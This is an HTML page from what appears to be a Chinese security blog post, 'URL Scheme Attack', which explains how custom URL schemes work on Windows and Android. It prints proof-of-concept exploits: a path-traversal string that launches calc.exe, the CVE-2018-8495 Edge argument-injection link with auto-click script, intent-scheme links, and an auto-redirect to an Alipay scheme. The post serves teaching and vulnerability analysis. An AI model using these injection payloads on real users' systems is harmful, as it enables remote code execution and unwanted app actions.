@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="URL scheme简介URL scheme是什么？简单的说就是部分app应用会注册自定义自己的协议，通过访问这类协议来调用启动app。url scheme的工作流程是：app在系统中注册url scheme项，当浏览器或其他支持url的应用访问 特定的 url scheme 时，在系统中查找相对应的url scheme项，从而启动该应用程序。基本上是各个平台的app都有。 例如mailto:ad">
+<meta name="keywords" content="网络安全,代码审计,安全开发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="URL Scheme Attack">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;experience&#x2F;url-scheme-attack.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="URL scheme简介URL scheme是什么？简单的说就是部分app应用会注册自定义自己的协议，通过访问这类协议来调用启动app。url scheme的工作流程是：app在系统中注册url scheme项，当浏览器或其他支持url的应用访问 特定的 url scheme 时，在系统中查找相对应的url scheme项，从而启动该应用程序。基本上是各个平台的app都有。 例如mailto:ad">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2018&#x2F;11&#x2F;09&#x2F;1541762829.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2018&#x2F;11&#x2F;09&#x2F;1541761277.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2018&#x2F;11&#x2F;09&#x2F;1541763690.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2018&#x2F;11&#x2F;10&#x2F;1541838893.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2018&#x2F;11&#x2F;10&#x2F;1541842168.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2018&#x2F;11&#x2F;10&#x2F;1541848929.gif">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2018&#x2F;11&#x2F;09&#x2F;1541762829.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>URL Scheme Attack</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/mobile-security/diva-writeup.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/experience/url-scheme-attack.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&text=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&is_video=false&description=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=URL Scheme Attack&body=Check out this article: http://zerokeeper.github.io/experience/url-scheme-attack.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&name=URL Scheme Attack&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-scheme简介"><span class="toc-number">1.</span> <span class="toc-text">URL scheme简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#例如"><span class="toc-number">1.1.</span> <span class="toc-text">例如</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#格式"><span class="toc-number">1.2.</span> <span class="toc-text">格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用场景"><span class="toc-number">1.3.</span> <span class="toc-text">使用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例"><span class="toc-number">2.</span> <span class="toc-text">案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Edge-远程代码执行"><span class="toc-number">3.</span> <span class="toc-text">Edge 远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Android-URL-scheme"><span class="toc-number">4.</span> <span class="toc-text">Android URL scheme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        URL Scheme Attack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-11-08T01:42:00.000Z" itemprop="datePublished">2018-11-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/experience/">experience</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="URL-scheme简介"><a href="#URL-scheme简介" class="headerlink" title="URL scheme简介"></a>URL scheme简介</h3><p>URL scheme是什么？简单的说就是部分app应用会注册自定义自己的协议，通过访问这类协议来调用启动app。url scheme的工作流程是：app在系统中注册url scheme项，当浏览器或其他支持url的应用访问 特定的 url scheme 时，在系统中查找相对应的url scheme项，从而启动该应用程序。基本上是各个平台的app都有。</p>
+<h4 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h4><p><code>mailto:admin@example.com,thunder://xxxxx,tel:+18888888888,sms:18688886666,alipays://platformapi/startapp</code>等等。当然还包括还有常见的file、dict、ftp，不过这里想说的是各类app应用程序的url scheme。</p>
+<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><pre><code>[scheme]://[host]/[path]?[query]</code></pre><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><ul>
+<li>特定后缀名的文件启动程序</li>
+<li>网页或者链接中的描点启动程序</li>
+</ul>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>windows平台下URL scheme会在注册表中注册，具体可<a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85)" target="_blank" rel="noopener">参考</a><br>在注册表中像这样格式存在的</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/09/1541762829.png" alt="snipaste_20181109_192603.png"></p>
+<p>例如</p>
+<pre><code>HKEY_CLASSES_ROOT
+   test
+      (Default) = &quot;URL:test Protocol&quot;
+      URL Protocol = &quot;&quot;
+      DefaultIcon
+         (Default) = &quot;test.exe,1&quot;
+      shell
+         open
+            command
+               (Default) = &quot;C:\Program Files\test\test.exe&quot; &quot;%1&quot;</code></pre><p>假设test.exe是注册的应用程序，%1是占位符启动参数。通过url传递参数给目标程序。双引号是为了避免参数中存在空格。这样的形式就很容易通过拼接参数出现命令注入了。<br>HKEY_CLASSES_ROOT 下不仅保存了伪协议的列表，还有文件扩展名的关联数据。事实上 Win32 程序处理本地文件和 url 的打开是类似的，甚至可以使用同一套 Win32 API —— ShellExecute(Ex) 。算上 ANSI 和 Unicode 的版本，一共 4 个函数。<br>打开文件</p>
+<pre><code>ShellExecuteW(NULL, L&quot;open&quot;, L&quot;c:\\test.txt&quot;, NULL, NULL , SW_SHOW );</code></pre><p>打开链接</p>
+<pre><code>ShellExecuteW(NULL, L&quot;open&quot;, L&quot;https://www.baidu.com&quot;, NULL, NULL , SW_SHOW );</code></pre><p> ShellExecute可以有利用的两个点：<br>传入 url，却被解析成本地路径而变成打开文件甚至运行可执行文件；<br>其次是关联命令行里包裹参数 “%1” 的双引号可以被闭合掉的。</p>
+<pre><code>www.baidu.com..\..\..\..\..\..\..\..\..\..\..\windows\system32\calc.exe</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/09/1541761277.png" alt="snipaste_20181109_190055.png"></p>
+<p>windows系统在运行框输入，利用多个跳转符，后面的windows\system32\calc.exe会被当成文件执行，运行即可弹出计算器，当年QQ的远程命令执行漏洞也是这个exp</p>
+<h3 id="Edge-远程代码执行"><a href="#Edge-远程代码执行" class="headerlink" title="Edge 远程代码执行"></a>Edge 远程代码执行</h3><p>edge(CVE-2018-8495)，2018年10月Edge的远程代码执行漏洞，利用了WSHFile协议，通过参数注入，造成远程代码执行。<br>查看\HKEY_CLASSES_ROOT\WSHFile\Shell\Open\Command的值<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/09/1541763690.png" alt="snipaste_20181109_193956.png"></p>
+<p>WSHFile是指向了wscript.exe，wscript.exe是windows的内置的脚本解释器，可以通过WSHFile去运行一个脚本。<br>具体可看其漏洞分析，最后构造的exp如下：</p>
+<pre><code>&lt;a id=&quot;q&quot; href=&apos;wshfile:test/../../WinSxS/AMD921~1.48_/SyncAppvPublishingServer.vbs&quot; test test;calc;&quot;&apos;&gt;test&lt;/a&gt;
+&lt;script&gt;
+window.onkeydown=e=&gt;{
+    window.onkeydown=z={};
+    q.click()
+}
+&lt;/script&gt;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/10/1541838893.png" alt="snipaste_20181110_163428.png"></p>
+<p>这是一个例子，还有更多的例子如Electron导致vscode、网易云命令执行的例子，可以看先前<a href="http://www.zerokeeper.com/vul-analysis/electron-remote-command-execution-vulnerability-cve20181000006.html" target="_blank" rel="noopener">分析</a></p>
+<h3 id="Android-URL-scheme"><a href="#Android-URL-scheme" class="headerlink" title="Android URL scheme"></a>Android URL scheme</h3><p>android上的Intent Scheme URLs攻击基于android浏览器桥梁间接实现Intend-Based攻击。可以读取文件或者启动调用的应用程序。</p>
+<p>语法如下：</p>
+<pre><code>&lt;script&gt;location.href = &quot;intent:mydata#Intent;action=myaction;type=text/plain;end&quot;&lt;/script&gt;  </code></pre><p>等价的java语法：</p>
+<pre><code>Intent intent = new Intent(&quot;myaction&quot;);  
+intent.setData(Uri.parse(&quot;mydata&quot;));  
+intent.setType(&quot;text/plain&quot;);</code></pre><p>例如：</p>
+<pre><code>&lt;a href=&quot;intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end&quot;&gt;
+   发送短信
+&lt;/a&gt;&lt;br&gt;
+
+&lt;a href=&quot;intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end&quot;&gt;
+   打开相机
+&lt;/a&gt;&lt;br&gt;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/10/1541842168.jpg" alt="20181110172511.jpg"></p>
+<p>使用Intent Scheme就可以通过浏览器调用android上的应用。</p>
+<p>还有一类就是第三方的URL Scheme，来启动android上的app。以打开某些网页会启动支付宝到抢红包界面为例</p>
+<pre><code>&lt;html&gt;
+&lt;script&gt;
+window.location.href=&apos;alipays://platformapi/startapp?saId=10000007&amp;clientVersion=3.7.0.0718&amp;qrcode=https%3A%2F%2Fqr.alipay.com%2Fc1x05309e4ttz2v7xrwrzcd%3F_s%3Dweb-other&apos;
+&lt;/script&gt;
+&lt;/html&gt;</code></pre><p>效果如下</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/10/1541848929.gif" alt="ec413b7289d2ec6a4cf5492e658b81cb-alipay.gif"></p>
+<p>只是这里的qrcode失效了，所以领取失败，换成自己的就可以了。<br>更进一步的就是之前的支付宝应用克隆，不过它除了伪协议，还利用了webview跨域，和APP的setAllowUniversalAccessFromFile URLs值为true，导致File协议可跨域读取文件。具体分析可<a href="https://open.appscan.io/article-470.html" target="_blank" rel="noopener">参考</a></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>URL scheme是为了操作系统、浏览器、应用方便交互设计，但操作系统不同、URL scheme功能不同，会导致存在安全问题。尤其是利用浏览器或者应用程序存在的漏洞，来攻击操作系统，扩大攻击面。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="https://paper.seebug.org/719/#0x02-url-scheme" target="_blank" rel="noopener">从 CVE-2018-8495 看 PC 端 url scheme 的安全问题</a></li>
+<li><a href="https://xz.aliyun.com/t/1994" target="_blank" rel="noopener">Electron 自定义协议命令注入（CVE-2018-1000006）分析和 Url Scheme 安全考古</a></li>
+<li><a href="http://drops.xmd5.com/static/drops/papers-2893.html" target="_blank" rel="noopener">Intent scheme URL attack</a></li>
+<li><a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf" target="_blank" rel="noopener">Aack Surface Extended by URL Schemes</a></li>
+<li><a href="https://xz.aliyun.com/t/2881" target="_blank" rel="noopener">cve-2018-8495-Microsoft Edge 远程命令执行-分析</a></li>
+<li><a href="https://www.freebuf.com/articles/terminal/160544.html" target="_blank" rel="noopener">应用克隆，从支付宝自动领红包链接谈起</a></li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-scheme简介"><span class="toc-number">1.</span> <span class="toc-text">URL scheme简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#例如"><span class="toc-number">1.1.</span> <span class="toc-text">例如</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#格式"><span class="toc-number">1.2.</span> <span class="toc-text">格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用场景"><span class="toc-number">1.3.</span> <span class="toc-text">使用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例"><span class="toc-number">2.</span> <span class="toc-text">案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Edge-远程代码执行"><span class="toc-number">3.</span> <span class="toc-text">Edge 远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Android-URL-scheme"><span class="toc-number">4.</span> <span class="toc-text">Android URL scheme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/experience/url-scheme-attack.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&text=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&is_video=false&description=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=URL Scheme Attack&body=Check out this article: http://zerokeeper.github.io/experience/url-scheme-attack.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&title=URL Scheme Attack" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/experience/url-scheme-attack.html&name=URL Scheme Attack&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
